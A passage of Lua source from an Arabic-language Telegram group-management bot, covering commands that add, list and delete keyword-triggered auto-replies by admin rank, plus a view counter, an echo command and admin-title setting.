if not msg.forward_info_ then
if database:get(bot_id..'lang:gp:'..msg.chat_id_) then
end
database:del(bot_id..'bot:viewget'..msg.sender_user_id_)
else
send(msg.chat_id_, msg.id_, '⋄مشاهدات المنشور '..msg.views_..' مشاهده تقريبا ')
database:del(bot_id..'bot:viewget'..msg.sender_user_id_)
end end
if text == "مشاهده المنشور" then
database:set(bot_id..'bot:viewget'..msg.sender_user_id_,true)
send(msg.chat_id_, msg.id_, '⋄ارسل لي المنشور الان ')
end

if text == ("مسح الردود العامه") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
local list = database:smembers(bot_id..'List:Rd:Sudo')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id..'List:Rd:Sudo')
end
send(msg.chat_id_, msg.id_," ⋄تم مسح الردود العامه")
end

if text == ("الردود العامه") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n⋄قائمة الردود العامه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = 'متحركه'
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = 'بصمه'
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = 'ملصق'
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = 'رساله'
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = 'صوره'
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = 'فيديو'
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = 'ملف'
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = 'اغنيه'
end
text = text..""..k.." >> ("..v..") »> {"..db.."}\n"
end
if #list == 0 then
text = " ⋄لا يوجد ردود عامه"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_)
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,' ⋄تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_, '⋄الان ارسل الرد الذي تريد اضافته \n⋄قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n⋄يمكنك اضافه الى النص :\n⋄🌐 `#username` > معرف المستخدم\n⋄📨 `#msgs` > عدد رسائل المستخدم\n⋄📎 `#name` > اسم المستخدم\n⋄🆔 `#id` > ايدي المستخدم\n⋄🎖 `#stast` > رتبه المستخدم \n⋄📝 `#edit` > عدد السحكات ')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_, 'true1')
database:set(bot_id..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:sadd(bot_id..'List:Rd:Sudo', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' ⋄تم ازالة الرد العام')
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..v..text)
end
database:del(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Rd:Sudo', text)
return false
end
end
if text == "اضف رد عام" and SudoBot2(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_, msg.id_,"⋄ارسل الكلمه التري تريد اضافتها")
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "مسح رد عام" and SudoBot2(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_, msg.id_,"⋄ارسل الكلمه التري تريد مسحها")
database:set(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '⋄الان ارسل الرد الذي تريد اضافته \n⋄قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n⋄يمكنك اضافه الى النص :\n⋄🌐 `#username` > معرف المستخدم\n⋄📨 `#msgs` > عدد رسائل المستخدم\n⋄📎 `#name` > اسم المستخدم\n⋄🆔 `#id` > ايدي المستخدم\n⋄🎖 `#stast` > رتبه المستخدم \n⋄📝 `#edit` > عدد السحكات ')
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"⋄تم ازالة الرد من قائمه ردود المطور")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..''..v..text)
end
database:del(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Rd:Sudo", text)
return false
end
end

if text and not database:get(bot_id.."Reply:Sudo"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Add:Rd:Sudo:stekr"..text)     
local Text = database:get(bot_id.."Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)

if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local Msguser = database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local edit = database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit)
local Text = Text:gsub('#msgs',Msguser)
local Text = Text:gsub('#stast',rtp)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Texting"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end

------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ⋄ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:Black:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:Black:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Black:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"⋄تم مسح الرد من ردود المتعدده")
database:del(bot_id..'botss:Black:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:Black:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:Black:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:Black:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:Black:List:Rd:Sudo", text)
return false
end
end
end
if text == ("مسح الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local list = database:smembers(bot_id.."botss:Black:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:Black:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:Black:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:Black:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:Black:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"⋄تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text == ("مسح ردود المدير") and Manager(msg) then
local list = database:smembers(bot_id.."List:Manager"..msg.chat_id_.."")
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id.."List:Manager"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"⋄تم مسح ردود المدير")
end
if text == ("ردود المدير") and Manager(msg) then
local list = database:smembers(bot_id.."List:Manager"..msg.chat_id_.."")
text = "⋄قائمه ردود المدير \nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = "متحركه 🎭"
elseif database:get(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = "بصمه 📢"
elseif database:get(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = "ملصق 🏷"
elseif database:get(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = "رساله ✉"
elseif database:get(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = "صوره 👤"
elseif database:get(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = "فيديو 📹"
elseif database:get(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_) then
db = "ملف 📁"
elseif database:get(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = "اغنيه 🎵"
end
text = text..""..k..">> ("..v..") -› {"..db.."}\n"
end
if #list == 0 then
text = "⋄لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"⋄تم حفظ الرد بنجاح")
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_, '⋄الان ارسل الرد الذي تريد اضافته \n⋄قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n⋄يمكنك اضافه الى النص :\n⋄🌐 `#username` > معرف المستخدم\n⋄📨 `#msgs` > عدد رسائل المستخدم\n⋄📎 `#name` > اسم المستخدم\n⋄🆔 `#id` > ايدي المستخدم\n⋄🎖 `#stast` > رتبه المستخدم \n⋄📝 `#edit` > عدد السحكات ')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true1')
database:set(bot_id..'Text:Manager'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_..'') == 'true2' then
send(msg.chat_id_, msg.id_,' ⋄تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false
end
end
if text == "اضف رد" and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_, msg.id_,"⋄ارسل الكلمه التي تريد اضافتها")
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "مسح رد" and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_, msg.id_,"⋄ارسل الكلمه التي تريد مسحها")
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '⋄الان ارسل الرد الذي تريد اضافته \n⋄قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n⋄يمكنك اضافه الى النص :\n⋄🌐 `#username` > معرف المستخدم\n⋄📨 `#msgs` > عدد رسائل المستخدم\n⋄📎 `#name` > اسم المستخدم\n⋄🆔 `#id` > ايدي المستخدم\n⋄🎖 `#stast` > رتبه المستخدم \n⋄📝 `#edit` > عدد السحكات ')
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
database:set(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"⋄تم ازالة الرد من قائمه الردود")
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false
end
end
if text and not database:get(bot_id.."Reply:Manager"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local Text = database:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local Msguser = database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local edit = database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit)
local Text = Text:gsub('#msgs',Msguser)
local Text = Text:gsub('#stast',rtp)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Texting"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------
if text and text:match("^قول (.*)$") and not database:get(bot_id.."Speak:after:me"..msg.chat_id_) then
local Textxt = text:match("^قول (.*)$")
send(msg.chat_id_, msg.id_, '['..Textxt..']')
end
if text == "راسلني" or text == 'كلمني' or text == 'ابعت بف' then
rpl = {"ها هلاو","انطق","قول","نعم","عايز اي"};
rdod = rpl[math.random(#rpl)]
send(msg.sender_user_id_, msg.id_, rdod)
send(msg.chat_id_, msg.id_, 'بعتلك في الخاص')
end
if text and text:match("^وضع لقب (.*)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local timsh = text:match("^وضع لقب (.*)$")
function start_function(extra, result, success)
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.result.can_promote_members == false then
send(msg.chat_id_, msg.id_,'⋄لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n⋄قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..') '
status  = '\n⋄الايدي »> '..result.sender_user_id_..'\n⋄تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
